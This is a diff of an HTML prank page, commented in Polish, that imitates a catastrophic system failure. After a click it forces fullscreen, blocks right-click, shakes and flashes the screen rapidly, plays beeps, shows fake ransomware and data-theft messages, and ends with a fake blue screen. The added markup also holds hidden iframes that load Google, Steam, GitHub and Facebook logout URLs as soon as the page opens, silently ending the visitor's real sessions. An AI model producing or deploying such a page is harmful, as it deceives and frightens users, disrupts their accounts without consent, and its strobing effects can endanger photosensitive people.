@@ -3,60 +3,111 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Error</title>
+<title>FATAL SYSTEM FAILURE - NO ESCAPE</title>
 <style>
+  /* Reset i baza */
   * { margin: 0; padding: 0; box-sizing: border-box; }
   html, body {
-    width: 100%; height: 100%; background: #000; color: #0f0;
-    font-family: 'Courier New', monospace; overflow: hidden;
+    width: 100vw; height: 100vh; overflow: hidden;
+    background: #000; color: #0f0;
+    font-family: 'Courier New', monospace;
+    cursor: crosshair;
     user-select: none;
   }
-  
-  /* Ekran błędu */
-  #screen {
-    position: fixed; inset: 0; z-index: 9999;
-    background: #0000aa; color: #fff;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    display: none; flex-direction: column; justify-content: center; align-items: center;
-    text-align: left; padding: 50px; font-size: 20px;
+
+  /* Baza pod wszystkie syfy */
+  .layer {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    pointer-events: none; z-index: 1;
   }
-  #screen h1 { font-size: 80px; margin-bottom: 20px; }
-  #screen p { margin-bottom: 10px; max-width: 800px; }
+
+  /* Efekt rozwalonego CSS */
+  @keyframes crazy-shake {
+    0% { transform: translate(0, 0) rotate(0deg) scale(1); }
+    25% { transform: translate(10px, -10px) rotate(2deg) scale(1.05); }
+    50% { transform: translate(-15px, 15px) rotate(-3deg) scale(0.95); }
+    75% { transform: translate(15px, 10px) rotate(1deg) scale(1.02); }
+    100% { transform: translate(-10px, -15px) rotate(-2deg) scale(1); }
+  }
+  .shake-hard { animation: crazy-shake 0.1s infinite; }
+
+  /* Glitch na tekście */
+  @keyframes text-glitch {
+    0% { text-shadow: 2px 0 red, -2px 0 blue; }
+    50% { text-shadow: -2px 0 red, 2px 0 blue; }
+    100% { text-shadow: 2px 0 red, -2px 0 blue; }
+  }
+  .glitch-text { animation: text-glitch 0.05s infinite; }
+
+  /* Ekran główny - wielkie napisy */
+  #main-screen {
+    position: fixed; inset: 0; z-index: 50;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    background: radial-gradient(circle, #300, #000);
+    text-align: center;
+  }
+  #main-screen h1 {
+    font-size: 8rem; color: #f00; margin-bottom: 20px;
+    text-shadow: 0 0 20px #f00, 0 0 40px #f00;
+  }
+  #main-screen p { font-size: 2rem; color: #fff; }
+
+  /* Elementy sieczki */
+  .random-box {
+    position: fixed; border: 2px solid #f00; background: rgba(0,0,0,0.8);
+    color: #fff; font-family: monospace; font-size: 12px; padding: 5px;
+    box-shadow: 0 0 10px #f00; z-index: 9999;
+  }
   
-  /* Terminal i matryca */
-  #matrix { position: fixed; inset: 0; z-index: 0; opacity: 0.3; }
+  .random-line {
+    position: fixed; background: #0f0; z-index: 9998; opacity: 0.5;
+  }
+
+  /* Nakładka matrixa */
+  #matrix-canvas { position: fixed; inset: 0; z-index: 2; opacity: 0.4; }
+
+  /* Terminal z błędami */
   #terminal {
-    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-    padding: 20px; font-size: 16px; line-height: 1.3;
-    white-space: pre-wrap; overflow: hidden; z-index: 2; text-shadow: 0 0 5px #0f0;
+    position: fixed; inset: 0; z-index: 10;
+    padding: 20px; font-size: 14px; line-height: 1.2;
+    overflow: hidden; text-shadow: 0 0 5px #0f0;
+    white-space: pre-wrap;
   }
-  .err { color: #f33; font-weight: bold; }
+  .err { color: #f00; font-weight: bold; }
   .warn { color: #ff0; }
 
-  /* Ukryte iframes do wylogowywania */
-  iframe { display: none; }
-  
-  /* Pasek glitchu */
-  .glitch-bar {
-    position: fixed; left: 0; width: 100%; height: 4px;
-    background: #f00; z-index: 9998; opacity: 0.8; box-shadow: 0 0 10px #f00;
+  /* Filtry rozwalające */
+  .filter-glitch {
+    position: fixed; inset: 0; z-index: 100;
+    pointer-events: none;
+    backdrop-filter: invert(1) hue-rotate(90deg);
+    opacity: 0; /* Będzie migać w JS */
   }
 </style>
 </head>
 <body>
 
-<canvas id="matrix"></canvas>
+<!-- Warstwy wizualne -->
+<canvas id="matrix-canvas"></canvas>
 <div id="terminal"></div>
-<div id="screen">
-  <h1>:(</h1>
-  <p>Twój komputer napotkał problem i wymaga ponownego uruchomienia.</p>
-  <p>Kod błędu: 0x000000F4</p>
-  <p>Trwa zbieranie informacji o błędzie... 0%</p>
+<div class="filter-glitch" id="glitch-filter"></div>
+
+<!-- Ekran startowy -->
+<div id="main-screen">
+  <h1 class="glitch-text">CRITICAL ERROR</h1>
+  <p>Kliknij, aby spróbować uratować system.</p>
 </div>
 
+<!-- Ukryte iframes do wywalania sesji -->
+<iframe src="https://accounts.google.com/Logout" style="display:none;"></iframe>
+<iframe src="https://store.steampowered.com/logout" style="display:none;"></iframe>
+<iframe src="https://github.com/logout" style="display:none;"></iframe>
+<iframe src="https://www.facebook.com/logout.php" style="display:none;"></iframe>
+
 <script>
-// --- 1. MATRYCA ---
-const canvas = document.getElementById('matrix');
+// ==== 1. MATRIX ====
+const canvas = document.getElementById('matrix-canvas');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
 canvas.height = window.innerHeight;
@@ -78,102 +129,126 @@ function drawMatrix() {
     drops[i]++;
   }
 }
-setInterval(drawMatrix, 35);
+setInterval(drawMatrix, 30);
 
-// --- 2. TERMINAL ---
+// ==== 2. TERMINAL ====
 const terminal = document.getElementById('terminal');
 const errors = [
-  '[CRITICAL] System32 files corrupted...',
-  '[ERROR] Cannot access memory at 0x00A1B2C3',
-  '> WARNING: Overheating detected!',
-  '> Injecting payload... SUCCESS',
-  '> Ransomware encrypted your files.',
-  '> JUST KIDDING. But you are scared, right?',
-  '> Your IP: 192.168.1.1 (tracking active)',
-  '> Sending data to server...',
-  '> [FATAL] Kernel panic.',
-  '> SYSTEM FAILURE IN 3... 2... 1...',
-  '> LOGOUT SEQUENCE INITIATED.'
+  '[FATAL] Kernel panic - not syncing: Fatal exception',
+  '[ERROR] Memory corruption detected at 0xDEADBEEF',
+  '> WARNING: CPU temperature critical: 105°C',
+  '> Uploading your files to 192.168.1.666...',
+  '> Ransomware encrypted your disk.',
+  '> JUST KIDDING! But you are scared, right?',
+  '> YOUR IP HAS BEEN LOGGED.',
+  '> Sending data to botnet...',
+  '> SYSTEM FAILURE IMMINENT.',
+  '> DO NOT TURN OFF YOUR COMPUTER.'
 ];
+
 function writeLine() {
   const div = document.createElement('div');
   const r = Math.random();
-  if (r < 0.4) div.className = 'err';
-  else if (r < 0.7) div.className = 'warn';
+  if (r < 0.5) div.className = 'err';
+  else if (r < 0.8) div.className = 'warn';
   div.textContent = errors[Math.floor(Math.random() * errors.length)];
   terminal.appendChild(div);
   terminal.scrollTop = terminal.scrollHeight;
-  if (terminal.childNodes.length > 50) terminal.removeChild(terminal.firstChild);
-}
-setInterval(writeLine, 80);
-
-// --- 3. PASEK GLITCHU ---
-function createGlitchBar() {
-  const bar = document.createElement('div');
-  bar.className = 'glitch-bar';
-  bar.style.top = (Math.random() * window.innerHeight) + 'px';
-  document.body.appendChild(bar);
-  setTimeout(() => bar.remove(), 150);
-}
-setInterval(createGlitchBar, 100);
-
-// --- 4. PRAWDZIWE WYLOGOWYWANIE (Ukryte iframes) ---
-// To są linki, które faktycznie kończą sesję.
-const logoutUrls = [
-  'https://accounts.google.com/Logout',
-  'https://store.steampowered.com/logout',
-  'https://github.com/logout',
-  'https://www.facebook.com/logout.php',
-  'https://discord.com/logout',
-  'https://www.youtube.com/logout'
-];
-
-function forceLogout() {
-  logoutUrls.forEach(url => {
-    // Tworzymy ukryte iframe. Przeglądarka załaduje link w tle i wyloguje.
-    const iframe = document.createElement('iframe');
-    iframe.src = url;
-    document.body.appendChild(iframe);
-  });
+  if (terminal.childNodes.length > 100) terminal.removeChild(terminal.firstChild);
 }
 
-// --- 5. RICKROLL W TLE ---
-function startRickroll() {
-  // Odtwarzamy ukryty film z YouTube (wymaga interakcji użytkownika wcześniej, np. kliknięcia)
-  const iframe = document.createElement('iframe');
-  iframe.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
-  iframe.style.position = "fixed";
-  iframe.style.bottom = "0"; iframe.style.right = "0";
-  iframe.style.width = "1px"; iframe.style.height = "1px"; // Ukryty, ale gra dźwięk
-  iframe.style.opacity = "0"; iframe.allow = "autoplay";
-  document.body.appendChild(iframe);
+// ==== 3. GENERATOR CHAOSU (setki elementów) ====
+function spawnChaos() {
+  // Losowe "błędy" na ekranie
+  const box = document.createElement('div');
+  box.className = 'random-box';
+  box.textContent = errors[Math.floor(Math.random() * errors.length)];
+  box.style.left = Math.random() * (window.innerWidth - 200) + 'px';
+  box.style.top = Math.random() * (window.innerHeight - 50) + 'px';
+  box.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 2 + 0.5})`;
+  document.body.appendChild(box);
+  setTimeout(() => box.remove(), Math.random() * 3000 + 1000);
+
+  // Losowe linie
+  const line = document.createElement('div');
+  line.className = 'random-line';
+  line.style.width = Math.random() * window.innerWidth + 'px';
+  line.style.height = Math.random() * 5 + 1 + 'px';
+  line.style.left = Math.random() * window.innerWidth + 'px';
+  line.style.top = Math.random() * window.innerHeight + 'px';
+  line.style.transform = `rotate(${Math.random() * 360}deg)`;
+  document.body.appendChild(line);
+  setTimeout(() => line.remove(), 500);
 }
 
-// --- 6. AKCJA (Odpala się po 2 sekundach) ---
-setTimeout(() => {
-  // Wylogowanie
-  forceLogout();
-  startRickroll();
+// ==== 4. DŹWIĘKI (beepy i szum) ====
+function playBeep() {
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    const gainNode = audioCtx.createGain();
+    oscillator.type = 'sawtooth';
+    oscillator.frequency.value = Math.random() * 1000 + 100;
+    gainNode.gain.value = 0.05;
+    oscillator.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+    oscillator.start();
+    oscillator.stop(audioCtx.currentTime + 0.1);
+  } catch(e) {}
+}
+
+// ==== 5. ODPALANIE CHAOSU (po kliknięciu) ====
+document.getElementById('main-screen').addEventListener('click', () => {
+  // Ukryj ekran startowy
+  document.getElementById('main-screen').style.display = 'none';
   
-  // Błędy lecą szybciej
-  setInterval(writeLine, 20);
+  // Włącz drgawki strony
+  document.body.classList.add('shake-hard');
+
+  // Włącz filtry
+  const filter = document.getElementById('glitch-filter');
+  setInterval(() => {
+    filter.style.opacity = Math.random() > 0.8 ? '0.3' : '0';
+  }, 100);
+
+  // Wymuś pełny ekran (jeśli przeglądarka pozwoli)
+  document.documentElement.requestFullscreen().catch(e => console.log('Fullscreen error:', e));
+
+  // Zablokuj menu kontekstowe (prawy przycisk)
+  document.addEventListener('contextmenu', e => e.preventDefault());
+
+  // Wysyp okienek i linii
+  setInterval(spawnChaos, 50);
+
+  // Zrzut tekstu terminala (coraz szybciej)
+  setInterval(writeLine, 10);
+
+  // Dźwięki
+  setInterval(playBeep, 200);
+
+  // Agresywne miganie tła
+  setInterval(() => {
+    document.body.style.background = Math.random() > 0.5 ? '#000' : '#300';
+  }, 50);
 
   // Po 5 sekundach wyskakuje fałszywy Blue Screen
   setTimeout(() => {
-    document.getElementById('terminal').style.display = 'none';
-    document.getElementById('matrix').style.display = 'none';
-    const bsod = document.getElementById('screen');
-    bsod.style.display = 'flex';
-    
-    // Blokujemy prawy przycisk myszy, żeby trudniej było wyjść
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    
-    // Wymuszamy pełny ekran (przeglądarka może wymagać wcześniejszego kliknięcia)
-    document.documentElement.requestFullscreen().catch(e => console.log("Fullscreen blocked"));
-    
+    document.body.innerHTML = `
+      <div style="position:fixed;inset:0;background:#0000aa;color:#fff;z-index:999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:'Segoe UI',sans-serif;text-align:center;padding:50px;">
+        <h1 style="font-size:100px;margin-bottom:20px;">:(</h1>
+        <h2 style="font-size:30px;margin-bottom:20px;">Twój komputer napotkał problem i wymaga ponownego uruchomienia.</h2>
+        <p style="font-size:20px;">Trwa zbieranie informacji o błędzie... 0%</p>
+        <p style="font-size:16px;margin-top:20px;">Kod błędu: 0x000000DEAD</p>
+        <p style="font-size:14px;margin-top:40px;color:#aaa;">Naciśnij ESC, aby spróbować wyjść (jeśli potrafisz).</p>
+      </div>
+    `;
   }, 5000);
 
-}, 2000);
+  // Po 10 sekundach atak wstrząsu końcowego (jeśli ktoś próbuje wyjść)
+  setTimeout(() => {
+    document.body.style.animation = 'crazy-shake 0.05s infinite';
+  }, 10000);
+});
 </script>
 </body>
 </html>
